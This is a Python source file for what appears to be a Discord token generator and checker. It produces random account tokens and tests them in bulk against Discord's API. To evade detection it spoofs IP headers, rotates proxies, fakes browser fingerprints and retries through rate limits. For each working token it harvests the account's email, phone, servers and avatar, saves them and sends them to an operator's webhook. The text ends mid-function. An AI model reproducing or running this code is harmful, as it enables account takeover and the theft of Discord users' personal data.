import base64
import time
import random
import string
import requests
import sys
import threading
import json
import asyncio
import aiohttp
import aiohttp_socks  # إضافة مكتبة دعم SOCKS
from aiohttp_socks import ProxyConnector  # إضافة connector للبروكسي
from datetime import datetime
from colorama import init, Fore, Back, Style
from tqdm import tqdm
from time import sleep
from concurrent.futures import ThreadPoolExecutor
import os
import io
from PIL import Image
import ctypes
import msvcrt

# Initialize colorama
init(autoreset=True)

# Set console title with dynamic information
def set_console_title(generator):
    if generator.show_title:
        if generator.is_checking:
            title = f"Discord Token Checker | Developer: Mokaram | Checked: {generator.total_checked} | Valid: {generator.total_valid} | Invalid: {generator.total_checked - generator.total_valid} | Speed: {1/max(generator.speed, 0.001):.2f}/s"
        else:
            title = f"Discord Token Generator | Developer: Mokaram | Generated: {generator.total_generated} | Speed: {1/max(generator.speed, 0.001):.2f}/s"
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        ctypes.windll.kernel32.SetConsoleTitleW("Discord Token Generator | Developer: Mokaram | Darkness Community: discord.gg/ezcpCsxYc8")

# Custom Colors with vibrant combinations
class Colors:
    PRIMARY = Fore.MAGENTA + Style.BRIGHT  # Bright magenta
    SECONDARY = Fore.CYAN + Style.BRIGHT  # Bright cyan
    SUCCESS = Fore.GREEN + Style.BRIGHT  # Bright green
    ERROR = Fore.RED + Style.BRIGHT  # Bright red
    WARNING = Fore.YELLOW + Style.BRIGHT  # Bright yellow
    INFO = Fore.BLUE + Style.BRIGHT  # Bright blue
    WHITE = Fore.WHITE + Style.BRIGHT  # Bright white
    GRAY = Fore.LIGHTBLACK_EX  # Light gray
    CYAN = Fore.CYAN + Style.BRIGHT  # Bright cyan
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Create directory if it doesn't exist
def ensure_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
        print(f"{Colors.SUCCESS}[✓] Created directory: {directory}")
    return directory

class TokenGenerator:
    def __init__(self):
        self.valid_tokens = []
        self.invalid_tokens = []
        self.stop_flag = False
        self.webhook_url = None
        self.speed = 0.1  # Default speed delay
        self.max_threads = 100  # Default max threads for verification
        self.session = None
        self.total_generated = 0
        self.total_valid = 0
        self.total_checked = 0
        self.save_tokens = True  # Default to save tokens
        
        # Create directory structure
        self.settings_dir = ensure_dir("settings")
        self.tokens_dir = ensure_dir("tokens")
        self.proxies_dir = ensure_dir("proxies")
        
        # Update file paths to use the new directory structure
        self.settings_file = os.path.join(self.settings_dir, "generator_settings.json")
        self.tokens_file = os.path.join(self.tokens_dir, "generated_tokens.txt")  # File to save tokens
        self.hits_file = os.path.join(self.tokens_dir, "hits_tokens.txt")  # File to save valid tokens
        self.default_check_file = os.path.join(self.tokens_dir, "tokens.txt")  # Default file for checking tokens
        self.proxies_file = os.path.join(self.proxies_dir, "proxies.txt")  # File for proxies
        
        self.show_title = False  # New variable to control title display
        self.is_checking = False  # New variable to determine operation type
        self.semaphore = None  # Initialize semaphore
        self.use_proxy = False  # New variable for proxy usage
        self.proxy = None  # New variable to store proxy
        self.proxies = []  # قائمة البروكسيات
        self.current_proxy_index = 0  # مؤشر البروكسي الحالي
        
        # Migrate existing files to new directory structure
        self.migrate_files()
        
        self.load_settings()
        self.load_proxies()  # تحميل البروكسيات عند بدء البرنامج
        set_console_title(self)  # Set initial title
        
    def migrate_files(self):
        """Migrate existing files from root directory to new directory structure"""
        # List of files to migrate with their source and destination
        files_to_migrate = [
            {"src": "generator_settings.json", "dst": self.settings_file},
            {"src": "generated_tokens.txt", "dst": self.tokens_file},
            {"src": "hits_tokens.txt", "dst": self.hits_file},
            {"src": "tokens.txt", "dst": self.default_check_file},
            {"src": "proxies.txt", "dst": self.proxies_file}
        ]
        
        for file_info in files_to_migrate:
            src_path = file_info["src"]
            dst_path = file_info["dst"]
            
            # Skip if source doesn't exist or destination already exists
            if not os.path.exists(src_path) or os.path.exists(dst_path):
                continue
                
            try:
                # Copy the file content
                with open(src_path, 'r', errors='ignore') as src_file:
                    content = src_file.read()
                
                with open(dst_path, 'w') as dst_file:
                    dst_file.write(content)
                    
                print(f"{Colors.SUCCESS}[✓] Migrated {src_path} to {dst_path}")
                
                # Optionally, create a backup instead of deleting
                backup_path = src_path + ".bak"
                if not os.path.exists(backup_path):
                    os.rename(src_path, backup_path)
                    print(f"{Colors.INFO}[*] Created backup of {src_path} as {backup_path}")
                
            except Exception as e:
                print(f"{Colors.ERROR}[!] Error migrating {src_path}: {str(e)}")

    async def init_session(self):
        """Initialize or reinitialize the session if closed"""
        if self.session and not self.session.closed:
            return
            
        try:
            if self.session and self.session.closed:
                await self.session.close()  # إغلاق الجلسة القديمة إذا كانت موجودة
        except:
            pass  # تجاهل أي أخطاء عند محاولة إغلاق جلسة مغلقة بالفعل
            
        # إعداد البروكسي إذا كان مفعلاً
        connector = None
        if self.use_proxy and self.proxy:
            try:
                connector = aiohttp.TCPConnector(ssl=False)
                self.session = aiohttp.ClientSession(connector=connector)
                print(f"{Colors.INFO}[*] Using proxy: {self.proxy}")
            except Exception as e:
                print(f"{Colors.ERROR}[!] Error setting up proxy: {str(e)}")
                self.session = aiohttp.ClientSession()
        else:
            self.session = aiohttp.ClientSession()
        
        if not self.semaphore:
            self.semaphore = asyncio.Semaphore(self.max_threads)

    def set_webhook(self, url):
        """Set Discord webhook URL"""
        if url is None or (isinstance(url, str) and url.lower() == 'none'):
            self.webhook_url = None
            print(f"{Colors.SUCCESS}[✓] Webhook disabled")
            self.save_settings()
            return True
        elif url and url.strip():
            # تحقق من تنسيق Discord webhook URL
            webhook_url = url.strip()
            if webhook_url.startswith(('https://discord.com/api/webhooks/', 'https://discordapp.com/api/webhooks/')):
                self.webhook_url = webhook_url
                self.save_settings()
                print(f"{Colors.SUCCESS}[✓] Webhook enabled")
                return True
            else:
                print(f"{Colors.ERROR}[!] Invalid Discord webhook URL format")
                return False
        return False

    def set_speed(self, speed):
        """Set generation speed (delay in seconds)"""
        self.speed = speed

    def set_threads(self, threads):
        """Set maximum number of threads for verification"""
        self.max_threads = threads
        # تحديث السيمافور عند تغيير عدد الثريدات
        if self.semaphore:
            self.semaphore = asyncio.Semaphore(threads)

    def generate_classic_token(self):
        """Generate a classic Discord token format (pre-2021)"""
        # Generate a random user ID (17-18 digits)
        user_id = ''.join(random.choices(string.digits, k=random.randint(17, 18)))
        
        # Convert to Base64, remove padding
        encoded_id = base64.b64encode(user_id.encode()).decode('utf-8').rstrip('=')
        
        # Generate the second part (timestamp/key component)
        # This is typically a mix of alphanumeric characters
        timestamp_component = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        
        # Generate the HMAC component (27-28 characters)
        hmac_component = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=random.randint(27, 28)))
        
        token = f"{encoded_id}.{timestamp_component}.{hmac_component}"
        return token, "Classic"

    def generate_new_token(self):
        """Generate a Discord token format (used 2021-2022)"""
        # First part is Base64 encoded user ID (18-19 digits)
        user_id = ''.join(random.choices(string.digits, k=random.randint(18, 19)))
        encoded_id = base64.b64encode(user_id.encode()).decode('utf-8').rstrip('=')
        
        # Second part is a key/timestamp component (typically 6 chars)
        timestamp_component = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        
        # Third part is HMAC/signature component (27-38 chars)
        hmac_length = random.choice([27, 28, 32, 38])
        hmac_component = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=hmac_length))
        
        token = f"{encoded_id}.{timestamp_component}.{hmac_component}"
        return token, "New"
    
    def generate_latest_token(self):
        """Generate the latest Discord token format (post-2022)
        Format examples:
        - MTExNjcxNTU4ODg0MTEyNzk3OA.GNMmWT.QMVGr3VFe9dHdmfr2c6uH0JD_8j09gc6k5VK6A
        - MTIzNDU2Nzg5MTAxMTEyMTMxNA.GEip0c.9QnRWZ902n3TM8U_5t0ymdhcKsFt7X-xAStx2Q
        Structure: [MTX] + [Base64 User ID] + [.G] + [Random 5-6 chars] + [.] + [Signature 27-38 chars]
        """
        # First part is MTX or a similar pattern (MT followed by a letter)
        prefixes = ["MTI", "MTU", "MTX", "MTA", "MTE"]
        prefix = random.choice(prefixes)
        
        # Second part is Base64 encoded user ID (varying length)
        id_length = random.randint(20, 25)
        id_part = ''.join(random.choices(string.digits + string.ascii_letters, k=id_length))
        
        # Second segment prefix is .G followed by a letter
        second_prefixes = [".G", ".g"]
        second_prefix = random.choice(second_prefixes)
        
        # Random characters in the second part
        key_chars = string.ascii_letters + string.digits + '_-'
        key_part = ''.join(random.choices(key_chars, k=random.randint(5, 6)))
        
        # HMAC signature component (typically 27-38 chars)
        signature_length = random.randint(27, 38)
        signature_part = ''.join(random.choices(string.ascii_letters + string.digits + '_-', k=signature_length))
        
        token = f"{prefix}{id_part}{second_prefix}{key_part}.{signature_part}"
        return token, "Latest"
    
    def generate_token(self, token_type="all"):
        """Generate a token based on specified type"""
        if token_type == "classic":
            return self.generate_classic_token()
        elif token_type == "new":
            return self.generate_new_token()
        elif token_type == "latest":
            return self.generate_latest_token()
        elif token_type == "both":
            return random.choice([self.generate_classic_token, self.generate_new_token])()
        else:  # "all" - include latest format as well
            return random.choice([self.generate_classic_token, self.generate_new_token, self.generate_latest_token])()

    async def get_user_info(self, token):
        """Get detailed user information using token"""
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        # إعداد البروكسي للطلب إذا كان مفعلاً
        proxy = None
        if self.use_proxy and self.proxy:
            proxy = self.proxy
        
        try:
            async with self.session.get('https://discord.com/api/v10/users/@me', 
                                      headers=headers,
                                      proxy=proxy,
                                      ssl=False if proxy else None) as r:
                if r.status == 200:
                    user_data = await r.json()
                    
                    # Get guilds with proxy
                    async with self.session.get('https://discord.com/api/v10/users/@me/guilds', 
                                              headers=headers,
                                              proxy=proxy,
                                              ssl=False if proxy else None) as r_guilds:
                        guilds = await r_guilds.json() if r_guilds.status == 200 else []

                    # Get avatar with proxy
                    avatar_url = None
                    avatar_data = None
                    if user_data.get('avatar'):
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png?size=1024"
                        try:
                            async with self.session.get(avatar_url,
                                                      proxy=proxy,
                                                      ssl=False if proxy else None) as r_avatar:
                                if r_avatar.status == 200:
                                    avatar_data = await r_avatar.read()
                        except:
                            pass
                    
                    return {
                        'id': user_data.get('id'),
                        'username': user_data.get('username'),
                        'discriminator': user_data.get('discriminator'),
                        'email': user_data.get('email'),
                        'phone': user_data.get('phone'),
                        'avatar': user_data.get('avatar'),
                        'avatar_url': avatar_url,
                        'avatar_data': avatar_data,
                        'guilds_count': len(guilds),
                        'created_at': datetime.fromtimestamp(((int(user_data['id']) >> 22) + 1420070400000) / 1000).strftime('%Y-%m-%d %H:%M:%S'),
                        'nitro_type': user_data.get('premium_type', 0),
                        'verified': user_data.get('verified', False),
                        'bio': user_data.get('bio', 'No bio set')
                    }
        except:
            return None

    def identify_token_format(self, token):
        """Identify the format of a Discord token
        
        Returns:
            str: "Latest", "New", "Classic", or "Unknown"
        """
        try:
            # Check for latest token format (post-2022)
            # Format: MTXyMjYwNDExNjA2NTM1MTY4.GeFcI6.9aeaq8ZVl1URnFgNWmC4kaI2XYuMJmgFVxbPK2
            if token.startswith("MT") and ".G" in token:
                parts = token.split('.')
                if len(parts) == 3 and parts[1].startswith("G"):
                    return "Latest"
            
            # Check for older formats (two periods)
            if token.count('.') == 2:
                parts = token.split('.')
                
                # Check if the first part is Base64 (classic tokens have Base64 encoded user ID)
                try:
                    decoded = base64.b64decode(parts[0] + "==")
                    # If we can decode and it looks like a numeric ID
                    if decoded.decode('utf-8').isdigit():
                        # Classic token (pre-2021)
                        if len(parts[1]) < 10:  # Short middle component
                            return "Classic"
                        else:
                            return "New"
                except:
                    # If not Base64 decodable properly, it's likely a "New" token
                    return "New"
                    
            return "Unknown"
        except:
            return "Unknown"
            
    async def print_user_info(self, token, user_info):
        """Print detailed user information with fancy formatting"""
        # Determine token format
        token_format = self.identify_token_format(token)
        
        print(f"\n{Colors.PRIMARY}{'═' * 70}")
        print(f"{Colors.SUCCESS}✓ Valid Token Found!")
        print(f"{Colors.PRIMARY}{'═' * 70}")
        
        # Token Info
        print(f"{Colors.INFO}Token: {Colors.WHITE}{token}")
        print(f"{Colors.INFO}Format: {Colors.WHITE}{token_format}")
        
        # Basic Info
        print(f"{Colors.INFO}Username: {Colors.WHITE}{user_info['username']}#{user_info['discriminator']}")
        print(f"{Colors.INFO}User ID: {Colors.WHITE}{user_info['id']}")
        
        # Contact Info
        print(f"\n{Colors.SECONDARY}Contact Information:")
        print(f"{Colors.INFO}Email: {Colors.WHITE}{user_info['email'] or 'Not set'}")
        print(f"{Colors.INFO}Phone: {Colors.WHITE}{user_info['phone'] or 'Not set'}")
        
        # Account Info
        print(f"\n{Colors.SECONDARY}Account Information:")
        print(f"{Colors.INFO}Created: {Colors.WHITE}{user_info['created_at']}")
        print(f"{Colors.INFO}Verified: {Colors.WHITE}{'Yes' if user_info['verified'] else 'No'}")
        print(f"{Colors.INFO}Nitro: {Colors.WHITE}{['None', 'Classic', 'Nitro', 'Basic'][user_info['nitro_type']]}")
        print(f"{Colors.INFO}Servers: {Colors.WHITE}{user_info['guilds_count']}")
        
        # Bio
        if user_info['bio']:
            print(f"\n{Colors.SECONDARY}Bio:")
            print(f"{Colors.WHITE}{user_info['bio']}")
        
        print(f"{Colors.PRIMARY}{'═' * 70}")

    async def send_webhook(self, token, user_info):
        """Send valid token info to Discord webhook"""
        if not self.webhook_url:
            return

        nitro_types = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
        
        # Determine token format
        token_format = self.identify_token_format(token)
        
        # Create main embed
        embed = {
            "title": "✨ Valid Token Found!",
            "color": 0xFF00FF,  # Magenta
            "fields": [
                {"name": "🔑 Token", "value": f"```{token}```", "inline": False},
                {"name": "🏷️ Format", "value": token_format, "inline": True},
                {"name": "👤 User Info", "value": f"**Username:** {user_info['username']}#{user_info['discriminator']}\n**ID:** {user_info['id']}", "inline": False},
                {"name": "📧 Email", "value": user_info['email'] or "None", "inline": True},
                {"name": "📱 Phone", "value": user_info['phone'] or "None", "inline": True},
                {"name": "🌟 Nitro", "value": nitro_types[user_info['nitro_type']], "inline": True},
                {"name": "🔰 Verified", "value": "Yes" if user_info['verified'] else "No", "inline": True},
                {"name": "🎮 Servers", "value": str(user_info['guilds_count']), "inline": True},
                {"name": "📅 Created", "value": user_info['created_at'], "inline": True}
            ],
            "thumbnail": {"url": user_info['avatar_url']} if user_info['avatar_url'] else None,
            "timestamp": datetime.utcnow().isoformat()
        }

        # Add bio if exists
        if user_info['bio']:
            embed["fields"].append({"name": "📝 Bio", "value": user_info['bio'][:1024], "inline": False})

        # Note: Token saving is now handled by the save_valid_token method and is not repeated here

        try:
            # Prepare multipart form data
            data = aiohttp.FormData()
            data.add_field('payload_json', json.dumps({"embeds": [embed]}))
            
            # Add avatar image if exists
            if user_info['avatar_data']:
                data.add_field('file1', 
                             user_info['avatar_data'],
                             filename='avatar.png',
                             content_type='image/png')
                embed["image"] = {"url": "attachment://avatar.png"}

            async with aiohttp.ClientSession() as session:
                async with session.post(self.webhook_url, data=data) as response:
                    if response.status != 204:
                        print(f"{Colors.ERROR}[!] Failed to send webhook: Status {response.status}")
                        error_text = await response.text()
                        print(f"{Colors.ERROR}[!] Error: {error_text}")
                    else:
                        print(f"{Colors.SUCCESS}[✓] Webhook sent successfully!")
        except Exception as e:
            print(f"{Colors.ERROR}[!] Failed to send webhook: {str(e)}")

    def update_title(self):
        """Update console title with current statistics"""
        set_console_title(self)

    def randomIpv6Address(self):
        """Generate a completely random IPv6 address"""
        ipv6Addresses = [
            "2600:1700:0c00:1c10:1c0c:1c0c:1c0c:1c0c",
            "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
            "2001:db8:0:0:0:ff:fe32:8329",
            "2001:0:3238:DFE1:63:0000:0000:FEFA",
            "2001:0db8:0000:0000:0000:8a2e:0070:7344",
            "2001:0db8:1234:5678:9abc:def0:ffff:ffff",
            "2001:1:1:1:1:1:1:1",
            "2001:db8:abcd:ef01:2345:6789:abcd:ef01",
            "2001:0db8:0000:0000:0000:0000:1428:57ab",
            "2001:0db8:0000:0000:0000:0000:ffff:ffff",
            "2001:0db8:0000:0000:0000:0000:0000:0001",
            "2001:0db8:0000:0000:0000:0000:0000:0000",
            "2001:0db8:0000:0000:0000:0000:0000:fe00"
        ]
        
        def generate_random_ipv6():
            # Generate random segments
            segments = [f"{random.randint(0, 65535):04x}" for _ in range(8)]
            # Join with colons
            return ":".join(segments)
        
        # Mix between predefined and random addresses
        if random.random() < 0.3:  # 30% chance to use predefined
            return random.choice(ipv6Addresses)
        else:  # 70% chance to generate new random address
            return generate_random_ipv6()

    def get_random_user_agent(self):
        """Get a random user agent to avoid detection"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
        ]
        return random.choice(user_agents)
        
    def get_random_system_properties(self):
        """Generate random system properties for X-Super-Properties"""
        os_types = ["Windows", "MacOS", "Linux", "Windows"]  # Windows twice for higher probability
        os_versions = ["10", "11", "10.15.7", "12.6", "22.04", "10"]  # Windows 10 twice for higher probability
        browsers = ["Chrome", "Firefox", "Edge", "Safari", "Chrome"]  # Chrome twice for higher probability
        browser_versions = ["119.0.0.0", "120.0.0.0", "118.0.0.0", "117.0.2045.60", "16.6", "109.0"]
        client_build_numbers = [246616, 246815, 247246, 247572, 248000, 248307]
        
        browser = random.choice(browsers)
        os_type = random.choice(os_types)
        
        # Adjust browser version to match browser type
        if browser == "Chrome":
            browser_version = random.choice(["119.0.0.0", "120.0.0.0", "118.0.0.0"])
        elif browser == "Firefox":
            browser_version = random.choice(["109.0", "115.0", "117.0"])
        elif browser == "Edge":
            browser_version = random.choice(["117.0.2045.60", "118.0.2088.76", "119.0.2151.58"])
        elif browser == "Safari":
            browser_version = random.choice(["16.6", "17.0", "16.5"])
        else:
            browser_version = random.choice(browser_versions)
            
        # Adjust OS version to match OS type
        if os_type == "Windows":
            os_version = random.choice(["10", "11"])
        elif os_type == "MacOS":
            os_version = random.choice(["10.15.7", "12.6", "13.1"])
        elif os_type == "Linux":
            os_version = random.choice(["22.04", "20.04", "5.15.0"])
        else:
            os_version = random.choice(os_versions)
            
        user_agent = f"Mozilla/5.0 ({os_type} NT {os_version}; Win64; x64) AppleWebKit/537.36"
        if browser == "Firefox":
            user_agent = f"Mozilla/5.0 ({os_type} NT {os_version}; Win64; x64; rv:{browser_version}) Gecko/20100101 Firefox/{browser_version}"
            
        return {
            "os": os_type,
            "browser": browser,
            "device": "",
            "system_locale": random.choice(["en-US", "en-GB", "es-ES", "fr-FR", "de-DE", "ar-SA"]),
            "browser_user_agent": user_agent,
            "browser_version": browser_version,
            "os_version": os_version,
            "referring_domain": "",
            "referrer_current": "",
            "client_build_number": random.choice(client_build_numbers),
            "client_event_source": None
        }

    async def save_valid_token(self, token, user_info):
        """Save valid token to file"""
        nitro_types = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
        token_format = self.identify_token_format(token)
        
        try:
            # Ensure the tokens directory exists
            ensure_dir(self.tokens_dir)
            
            with open(self.hits_file, 'a', encoding='utf-8') as f:
                f.write(f"Token: {token}\n")
                f.write(f"Format: {token_format}\n")
                f.write(f"Username: {user_info['username']}#{user_info['discriminator']}\n")
                f.write(f"Email: {user_info['email'] or 'None'}\n")
                f.write(f"Phone: {user_info['phone'] or 'None'}\n")
                f.write(f"Nitro: {nitro_types[user_info['nitro_type']]}\n")
                f.write(f"Verified: {'Yes' if user_info['verified'] else 'No'}\n")
                f.write(f"Servers: {user_info['guilds_count']}\n")
                f.write(f"Created: {user_info['created_at']}\n")
                f.write("=" * 50 + "\n\n")
            print(f"{Colors.SUCCESS}[✓] Token saved to {self.hits_file}")
        except Exception as e:
            print(f"{Colors.ERROR}[!] Error saving valid token: {str(e)}{Colors.RESET}")

    # وقت انتظار متكيف للتعامل مع Rate Limit
    async def adaptive_wait(self, status_code=429, retry_after=None):
        """Wait adaptively based on rate limit status"""
        if status_code == 429:
            # إذا تم تمرير وقت الانتظار، استخدمه
            wait_time = retry_after if retry_after else random.uniform(5, 15)
            print(f"{Colors.WARNING}[!] Rate limited. Waiting {wait_time:.2f}s before retrying...{Colors.RESET}")
        else:
            # انتظار عشوائي بين الطلبات حتى عندما لا يكون هناك تقييد
            wait_time = random.uniform(0.5, 2)
            
        await asyncio.sleep(wait_time)
        return wait_time

    async def verify_token_async(self, token):
        """Verify token asynchronously with detailed error handling"""
        if not self.session or self.session.closed:
            await self.init_session()
            
        if not self.semaphore:
            self.semaphore = asyncio.Semaphore(self.max_threads)

        # استخدام المولدات العشوائية لتنويع معلومات الطلب
        user_agent = self.get_random_user_agent()
        system_props = self.get_random_system_properties()
        
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'X-Forwarded-For': self.randomIpv6Address(),
            'X-Fingerprint': ''.join(random.choices(string.hexdigits, k=18)).lower(),
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Accept-Language': system_props['system_locale'] + ',en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'sec-ch-ua': f'"Not_A Brand";v="8", "{system_props["browser"]}";v="{system_props["browser_version"].split(".")[0]}"',
            'sec-ch-ua-platform': f'"{system_props["os"]}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'X-Discord-Locale': system_props['system_locale'],
            'X-Super-Properties': base64.b64encode(json.dumps(system_props).encode()).decode()
        }

        async with self.semaphore:
            try:
                if self.session.closed:
                    await self.init_session()
                
                # إعداد البروكسي للطلب إذا كان مفعلاً
                proxy = None
                if self.use_proxy:
                    if self.proxies:
                        proxy = self.get_next_proxy()
                    else:
                        proxy = self.proxy
                    
                async with self.session.get('https://discord.com/api/v10/users/@me', 
                                          headers=headers,
                                          proxy=proxy,
                                          ssl=False if proxy else None,
                                          timeout=5) as r:  # تقليل وقت الانتظار إلى 5 ثواني
                    if r.status == 200:
                        # جلب معلومات المستخدم عند اكتشاف توكن صحيح
                        user_info = await self.get_user_info(token)
                        if user_info:
                            # طباعة معلومات التوكن
                            await self.print_user_info(token, user_info)
                            
                            # حفظ التوكن في الملف
                            await self.save_valid_token(token, user_info)
                            
                            # إرسال إلى ويبهوك ديسكورد إذا كان مفعلاً
                            if self.webhook_url:
                                await self.send_webhook(token, user_info)
                            
                        self.total_valid += 1
                        self.update_title()
                        return True
                    elif r.status == 401:
                        print(f"{Colors.ERROR}[!] Invalid Token: Authentication failed{Colors.RESET}")
                    elif r.status == 403:
                        print(f"{Colors.ERROR}[!] Forbidden: Token lacks permissions{Colors.RESET}")
                    elif r.status == 429:
                        try:
                            response_data = await r.json()
                            retry_after = response_data.get('retry_after', 5)
                            print(f"{Colors.WARNING}[!] Rate Limited: Retry after {retry_after}s{Colors.RESET}")
                            await asyncio.sleep(retry_after)
                            return await self.verify_token_async(token)
                        except:
                            print(f"{Colors.WARNING}[!] Rate Limited: Using default wait time{Colors.RESET}")
                            await asyncio.sleep(5)
                            return await self.verify_token_async(token)
                    elif r.status == 404:
                        print(f"{Colors.ERROR}[!] Not Found: API endpoint error{Colors.RESET}")
                    elif r.status == 500:
                        print(f"{Colors.ERROR}[!] Internal Server Error: Discord API issue{Colors.RESET}")
                        await asyncio.sleep(1)  # تقليل وقت الانتظار
                    elif r.status == 502:
                        print(f"{Colors.WARNING}[!] Bad Gateway: Discord API issue{Colors.RESET}")
                        await asyncio.sleep(1)  # تقليل وقت الانتظار
                    else:
                        print(f"{Colors.ERROR}[!] Unknown Error: Status code {r.status}{Colors.RESET}")
                        try:
                            error_text = await r.text()
                            print(f"{Colors.ERROR}[!] Error Details: {error_text}{Colors.RESET}")
                        except:
                            pass

            except aiohttp.ClientProxyConnectionError:
                print(f"{Colors.ERROR}[!] Proxy Connection Error: Could not connect to proxy{Colors.RESET}")
                if self.proxies:
                    return await self.verify_token_async(token)
            except aiohttp.ClientConnectorError:
                print(f"{Colors.ERROR}[!] Connection Error: Could not connect to Discord{Colors.RESET}")
                await asyncio.sleep(1)  # تقليل وقت الانتظار
            except asyncio.TimeoutError:
                print(f"{Colors.ERROR}[!] Timeout Error: Request took too long{Colors.RESET}")
                await asyncio.sleep(0.5)  # تقليل وقت الانتظار
            except Exception as e:
                print(f"{Colors.ERROR}[!] Unexpected Error: {str(e)}{Colors.RESET}")
                
                if "Session is closed" in str(e):
                    await self.init_session()
                    return await self.verify_token_async(token)
                
                await asyncio.sleep(0.5)  # تقليل وقت الانتظار

            self.total_checked += 1
            self.update_title()
            return False

    def save_generated_token(self, token, is_valid=None):
        """Save generated token to file if save_tokens is enabled"""
        if not self.save_tokens:
            return
            
        try:
            # Ensure the tokens directory exists
            ensure_dir(self.tokens_dir)
            
            with open(self.tokens_file, 'a') as f:
                if is_valid is None or is_valid:  # Only save if not invalid
                    f.write(f"{token}\n")
        except Exception as e:
            print(f"{Colors.ERROR}[!] Failed to save token: {e}")

    async def check_stop_key(self):
        """Check for stop key press"""
        while not self.stop_flag:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key == b'\x1b':  # ESC key
                    self.stop_flag = True
                    print(f"\n{Colors.WARNING}[!] Stopping operation...{Colors.RESET}")
                    break
            await asyncio.sleep(0.1)
    async def generate_infinite(self, verify=False, token_type="all"):
        """Generate tokens infinitely"""
        self.stop_flag = False
        count = 0
        
        # تهيئة الجلسة إذا كانت مغلقة
        await self.init_session()
            
        # Start stop key checker
        stop_checker = asyncio.create_task(self.check_stop_key())
        
        start_time = time.time()
        self.show_title = True  # Enable title display
        self.is_checking = verify  # Set operation type
        
        print(f"{Colors.INFO}Generating tokens infinitely... Press ESC to stop.{Colors.RESET}")
        print(f"{Colors.INFO}Type: {Colors.SECONDARY}{token_type.capitalize()}{Colors.RESET}")
        print(f"{Colors.INFO}Verification: {Colors.SECONDARY}{'Enabled' if verify else 'Disabled'}{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'═' * 70}{Colors.RESET}")
        
        while not self.stop_flag:
            # إذا كانت الجلسة مغلقة بعد عدد من المحاولات، إعادة تهيئتها
            if verify and count % 10 == 0 and (not self.session or self.session.closed):
                await self.init_session()
                
            token, format_type = self.generate_token(token_type)
            if verify:
                is_valid = await self.verify_token_async(token)
                status = f"{Colors.SUCCESS}VALID" if is_valid else f"{Colors.ERROR}INVALID"
                if is_valid:
                    self.valid_tokens.append(token)
                    self.save_generated_token(token, True)
                else:
                    self.invalid_tokens.append(token)
            else:
                status = f"{Colors.WARNING}NOT VERIFIED"
                self.save_generated_token(token)  # Save unverified tokens
            
            count += 1
            self.total_generated += 1
            print(f"{Colors.CYAN}[{count}] {Colors.WHITE}Token: {Colors.SECONDARY}{token}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] {Colors.WHITE}Format: {Colors.SECONDARY}{format_type}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] {Colors.WHITE}Status: {status}{Colors.RESET}")
            print(f"{Colors.PRIMARY}{'═' * 70}{Colors.RESET}")
            
            await asyncio.sleep(self.speed)
        
        # Cancel stop key checker
        stop_checker.cancel()
        
        self.show_title = False  # Disable title display when done
        self.is_checking = False  # Reset operation type
        set_console_title(self)
        
        if self.stop_flag:
            print(f"\n{Colors.SUCCESS}[✓] Operation stopped by user{Colors.RESET}")
        else:
            print(f"\n{Colors.SUCCESS}[✓] Operation completed{Colors.RESET}")

    async def generate_specific(self, amount, verify=False, token_type="all"):
        """Generate a specific amount of tokens"""
        self.stop_flag = False
        print(f"\n{Colors.INFO}Generating {amount} tokens...")
        
        # تهيئة الجلسة إذا كانت مغلقة
        await self.init_session()
        
        # Start stop key checker
        stop_checker = asyncio.create_task(self.check_stop_key())
        
        self.show_title = True  # Enable title display
        self.is_checking = verify  # Set operation type
        
        print(f"{Colors.INFO}Type: {Colors.SECONDARY}{token_type.capitalize()}{Colors.RESET}")
        print(f"{Colors.INFO}Verification: {Colors.SECONDARY}{'Enabled' if verify else 'Disabled'}{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'═' * 70}{Colors.RESET}")
        
        start_time = time.time()
        count = 0
        
        for i in tqdm(range(amount), desc="Progress", bar_format="{l_bar}%s{bar}%s{r_bar}" % (Fore.GREEN, Fore.RESET)):
            if self.stop_flag:
                break
                
